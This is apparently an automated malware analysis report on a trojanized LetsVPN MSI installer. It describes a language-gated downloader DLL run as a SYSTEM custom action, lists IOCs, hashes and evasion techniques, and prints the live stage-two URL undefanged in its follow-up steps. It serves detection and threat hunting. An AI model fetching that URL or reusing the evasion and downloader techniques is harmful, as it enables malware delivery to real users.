# Malware Analysis Report — lets--VPN.msi

**Date**: 2026-06-01  
**Analyst**: REMnux Automated Analysis  
**Sample**: `lets--VPN.msi`

---

## 1. File Metadata

| Field | Value |
|---|---|
| Filename | `lets--VPN.msi` |
| SHA256 | `532e97b35149db5010be30f6619d76e1e987c29133416f87a860ff886b141d3c` |
| SHA1 | `62e444b91de0e7399f23e86a8bae4613e9fb52f6` |
| MD5 | `e1ec08de0183c389485950ff21cfd24c` |
| Size | 30,929,920 bytes (~29.5 MB) |
| Type | MSI Installer (Composite Document File V2 / CFB) |
| Builder | Advanced Installer 20.2 build 2c3f1cf9 |
| Code Page | 936 (Simplified Chinese) |
| Product Language | 2052 (zh-CN) |
| Product Name | `lets-latest` |
| Product Version | 1.0.0 |
| MSI GUID | `{64F44205-5CF2-44F9-9B58-4B11CD989950}` |
| Certificate Subject | Morning Leap & Cazo Electronics Technology Co., Ltd. |
| Certificate Issuer | GlobalSign GCC R45 EV CodeSigning CA 2020 |
| Certificate Serial | `2686b9982e46da7e3e0a1d56` |
| Certificate Validity | 2024-05-16 → 2025-05-16 (**EXPIRED**) |
| MSI Last Saved | 2020-09-18 (backdated metadata; actual build ~Sep–Oct 2024) |

### Embedded Malicious Component: `Fload.dll`

| Field | Value |
|---|---|
| SHA256 | `36aa64c639950ada606f1250fa8041d9bbcef11fade428680ba0dfde02229da0` |
| SHA1 | `cee66374176092783be88ee365f828795aa99501` |
| MD5 | `ba9d6eb581f1fc15af081a48368f21bb` |
| Size | 262,447,104 bytes (250 MB) |
| Type | PE32+ x64 DLL (7 sections) |
| Export | `wh` (ordinal 1 — only export) |
| Module Name | `FLoad.dll` |
| Timestamp | `ffffffff` (zeroed — deliberate evasion) |
| Debug Date | 2024-09-15 08:35:28 (Pogo/ILTCG) |
| `.data` section | 262,149,120 bytes, entropy=4, **100% null bytes** (size inflation) |
| Actual code | ~280 KB (`.text` + `.rdata`) |

---

## 2. Classification

| Field | Value |
|---|---|
| **Type** | Trojanized MSI installer / Staged downloader |
| **Confidence** | **High** |
| **Family** | Unattributed (KesaKode online: 2.42% — below 20% attribution threshold; see notes) |
| **Target** | Chinese-language Windows systems only |
| **Execution context** | SYSTEM account, during MSI installation |

**Summary**: `lets--VPN.msi` is a trojanized installer for LetsVPN (a legitimate Chinese VPN product). The installer bundles a genuine LetsVPN 3.10.2 application alongside a malicious DLL (`Fload.dll`) that is executed as an MSI Custom Action during installation with SYSTEM privileges. The DLL exits silently on non-Chinese-language systems, acting as a language-gated second-stage downloader that contacts an Alibaba Cloud OSS bucket to retrieve and execute additional payloads.

---

## 3. Capabilities

- **Trojanized installer**: Bundles legitimate LetsVPN 3.10.2 (Squirrel-based WPF .NET client) with malicious DLL to maintain cover
- **MSI Custom Action abuse**: `Fload.dll!wh` called via `stdDllWrapper.dll_1` → `CallStdFcn` as Type 1729 deferred custom action (SYSTEM, runs after `InstallFiles`)
- **Language gate**: `GetSystemDefaultLangID() & 0x3FF == 4` → exits if not Chinese; executes only on Simplified/Traditional Chinese systems
- **Size inflation anti-AV**: 262MB DLL with 262MB `.data` section filled entirely with null bytes; actual malicious code ~280 KB
- **Stage-2 retrieval**: Downloads URL list `xb.txt` from Alibaba Cloud OSS (Hong Kong) via WinInet, UA `WindowsNt Chrome UserAgent 1.1-Http-link`
- **Multi-payload drop**: Parses `xb.txt` line-by-line; downloads each URL to `%APPDATA%\<UUID>\<filename>`; creates UUID-named subdirectory via `SHGetFolderPathW` + `UuidCreate`
- **DLL sideloading setup**: Specifically targets `steam_api64.dll` in the UUID directory for post-download processing (likely decompression; `sub_180002c90`)
- **Payload execution**: Executes `%APPDATA%\<UUID>\down.exe` via `WinExec` (SW_SHOW=5)
- **CRC32 integrity**: `sub_180001408` implements CRC32 (100% KesaKode match); likely used to verify downloaded payloads
- **XOR loops**: 14 XOR-in-loop instances detected; anomalies indicate obfuscated stack strings (`StackArrayInitialisationX64`)
- **Decompression**: `Decompressed %u → %u bytes in %.2f seconds` string confirms downloaded payloads are compressed before execution

---

## 4. Attack Chain

```
User runs lets--VPN.msi
        │
        ▼
MSI sequence 4000 — InstallFiles
   Extracts disk1.cab → install directory
   (includes Fload.dll alongside legitimate LetsVPN files)
        │
        ▼
MSI sequence 6261 — AI_DATA_SETTER  [condition: NOT Installed]
   Sets property: CallFunctionFromDLL = [#Fload.dll]?V;;C;wh;
        │
        ▼
MSI sequence 6262 — CallFunctionFromDLL  [condition: NOT Installed]
   Type 1729 (deferred, SYSTEM context)
   stdDllWrapper.dll_1!CallStdFcn reads property
   → LoadLibrary(Fload.dll)
   → calls exported function wh()
        │
        ▼
Fload.dll!wh()
   GetSystemDefaultLangID()
   ├── LCID & 0x3FF != 4 → print "System language is not Chinese. Exiting..."
   │                         return (silent exit)
   └── LCID & 0x3FF == 4 → call sub_180003d80()
        │
        ▼
sub_180003d80()  [Chinese systems only]
   GetProcessHeap() / HeapAlloc(0xFA00000)
   SHGetFolderPathW(CSIDL_APPDATA)          → %APPDATA%
   UuidCreate() + UuidToStringW()            → <UUID>
   CreateDirectory(%APPDATA%\<UUID>\)
        │
        ▼
sub_180003490()  [Downloader — xb.txt fetcher]
   InternetOpenW("WindowsNt Chrome UserAgent 1.1-Http-link")
   InternetOpenUrlW("https://mmnck.oss-cn-hongkong.aliyuncs.com/xb.txt")
   InternetReadFile → reads URL list line by line
   For each URL line:
     filename = text after last '/'
     sub_180002ea0(url, %APPDATA%\<UUID>\filename)
        │
        ▼
sub_180002ea0()  [Per-URL downloader + saver]
   InternetOpenW("FileSave")
   InternetOpenUrlW(url)
   InternetReadFile → stream to disk at target path
   "File downloaded successfully: %s"
        │
        ▼
sub_180003d80() continued
   Path: %APPDATA%\<UUID>\steam_api64.dll
   sub_180002c90(path, path)               → decompress/process DLL
   Path: %APPDATA%\<UUID>\down.exe
   WinExec(path, SW_SHOW)                  → EXECUTE PAYLOAD
        │
        ▼
LetsVPN installation completes normally
(user sees no anomaly; VPN is functional)
```

---

## 5. IOCs

### Network (defanged)
| Type | Value |
|---|---|
| URL (C2 stage-2 config) | `https[://]mmnck[.]oss-cn-hongkong[.]aliyuncs[.]com/xb.txt` |
| Domain (Alibaba Cloud OSS HK) | `mmnck[.]oss-cn-hongkong[.]aliyuncs[.]com` |
| User-Agent | `WindowsNt Chrome UserAgent 1.1-Http-link` |
| User-Agent (secondary) | `FileSave` |

### Filesystem
| Type | Value |
|---|---|
| Drop directory | `%APPDATA%\<UUID>\` (UUID generated per installation) |
| Sideload DLL | `%APPDATA%\<UUID>\steam_api64.dll` |
| Executed payload | `%APPDATA%\<UUID>\down.exe` |
| Malicious installer DLL | `Fload.dll` (in LetsVPN install directory) |

### Hashes
| File | SHA256 |
|---|---|
| `lets--VPN.msi` (installer) | `532e97b35149db5010be30f6619d76e1e987c29133416f87a860ff886b141d3c` |
| `Fload.dll` (malicious DLL) | `36aa64c639950ada606f1250fa8041d9bbcef11fade428680ba0dfde02229da0` |
| `letslatest.exe` (Squirrel installer, appears legitimate) | `07f44325eab13b01d536a42e90a0247c6efecf23ccd4586309828aa814f5c776` |

### Certificate
| Field | Value |
|---|---|
| Subject | Morning Leap & Cazo Electronics Technology Co., Ltd. |
| Serial | `2686b9982e46da7e3e0a1d56` |
| Issuer | GlobalSign GCC R45 EV CodeSigning CA 2020 |
| Valid | 2024-05-16 → **2025-05-16 (EXPIRED)** |

### MSI Artifacts
| Field | Value |
|---|---|
| Product GUID | `{64F44205-5CF2-44F9-9B58-4B11CD989950}` |
| Upgrade Code | `{9469F963-E322-45A2-B26E-5E51AC6B5807}` |
| Malicious CustomAction | `CallFunctionFromDLL` (Type 1729, `stdDllWrapper.dll_1!CallStdFcn`) |
| Malicious property value | `[#Fload.dll]?V;;C;wh;` |

---

## 6. Emulation Results

**Speakeasy (pass 1 — generic runner)**: 0 IOCs recovered. The language gate (`GetSystemDefaultLangID()` → Chinese check) terminates execution before any network activity in the emulation environment. This is the same reason ANY.RUN scored 0/100.

**Plain speakeasy**: Not attempted separately — the emulation limitation is the language check, not an API stub gap. Patching the language check would recover network IOCs but the C2 URL was already recovered statically.

---

## 7. Sandbox Results

**ANY.RUN** (task: `2fdd28e4-3065-41d9-b23b-811b09d6812d`):  
- Score: **0/100** — "No threats detected"  
- Tags: none  
- Analysis: Only Microsoft telemetry/CRL traffic observed. The MSI installed LetsVPN cleanly; `Fload.dll!wh` ran but exited immediately due to English-language sandbox environment.
- Public URL: `https://app.any.run/tasks/2fdd28e4-3065-41d9-b23b-811b09d6812d`

This 0/100 score is **expected and intentional** — the language gate is specifically designed to pass English-language sandbox environments while targeting Chinese-language victims.

---

## 8. KesaKode Results

**Online KesaKode**: 2.42% (MulCom), 0.40% (FormerFirstRAT), 0.40% (PNGPlugLoader)  
→ All scores are **below the 20% attribution threshold**; these matches are discarded for attribution purposes.

**Function-level observations** (not attributed):
- `sub_180001000`, `sub_180001408` (CRC32) → 100% MulCom function match at individual function level only
- `sub_180001b00` → 100% PNGPlugLoader function match at individual function level only
- `scalar deleting destructor` → cryptopp library code

The malicious downloader functions (`wh`, `sub_180003490`, `sub_180002ea0`, `sub_180003d80`) are all **UNKNOWN** — no family database match. This suggests a custom or private tool, not a known commodity family.

---

## 9. Analyst Notes

### Evasion Summary
| Technique | Implementation |
|---|---|
| Size inflation | 262MB DLL, `.data` = 100% zeros; bypasses file upload to AV/sandbox services |
| Language gate | Chinese LCID check on entry; exits silently on all English sandboxes → 0/100 ANY.RUN |
| Timestamp zeroing | Fload.dll PE timestamp = `ffffffff`; hides build date |
| Expired EV cert | MSI signed with GlobalSign EV cert (valid at build time, expired 2025-05-16) |
| Install-time execution | Malware runs as a SYSTEM-context MSI custom action before user ever launches VPN |
| Condition gate | `NOT Installed` condition ensures payload only fires on fresh install, not repair/upgrade |

### Legitimate Application
The LetsVPN 3.10.2 application installed alongside the malware is structurally complete:
- `LetsPRO.exe` (WPF .NET, 1.57MB) — main VPN client
- `libwin.dll` (Go DLL) — VPN protocol implementation (`WinDLL_WarmAPI`, `WinDLL_CallAPI`)
- `LetsVPNDomainModel.dll`, `LetsVPNInfraStructure.dll` — .NET domain/infra layers
- `tap0901.sys` + `tapinstall.exe` — OpenVPN TAP adapter (legitimate driver)
- `Microsoft.AppCenter.*` — crash reporting telemetry
- Squirrel auto-update framework (`Update.exe`, `NuGet.Squirrel.dll`)

The VPN likely functions normally. Victims would have no visible indication of compromise.

### Stage-2 Unknown
The content of `xb.txt` was not retrieved during analysis (C2 bucket may be offline or gated). The downloaded payloads (`steam_api64.dll` + `down.exe`) are unknown. The DLL sideloading pattern (`steam_api64.dll` + a host EXE that loads it) is consistent with many Chinese-origin info-stealer or RAT campaigns. `down.exe` may itself be a dropper or updater.

### Recommended Follow-Up
1. Attempt live retrieval of `https://mmnck.oss-cn-hongkong.aliyuncs.com/xb.txt` from a Chinese-locale environment or via a proxy to identify the second-stage payload
2. Investigate the "Morning Leap & Cazo Electronics Technology Co., Ltd." entity (Cangzhou, Hebei) and any other MSI samples signed with serial `2686b9982e46da7e3e0a1d56`
3. Search for other samples with the same Alibaba Cloud OSS bucket (`mmnck.oss-cn-hongkong.aliyuncs.com`) to identify the full campaign
4. Hunt for `Fload.dll` (by hash or the `wh` export + size inflation pattern) in enterprise EDR telemetry
5. Pivot on the MSI product GUID `{64F44205-5CF2-44F9-9B58-4B11CD989950}` and upgrade code `{9469F963-E322-45A2-B26E-5E51AC6B5807}` for related samples
6. Check whether `libwin.dll` (SHA256: `0970b9e25ab38aec1b95c22859c2f8e266f82a3ef26494deee6911aa1905072a`) is the legitimate LetsVPN Go DLL or also modified
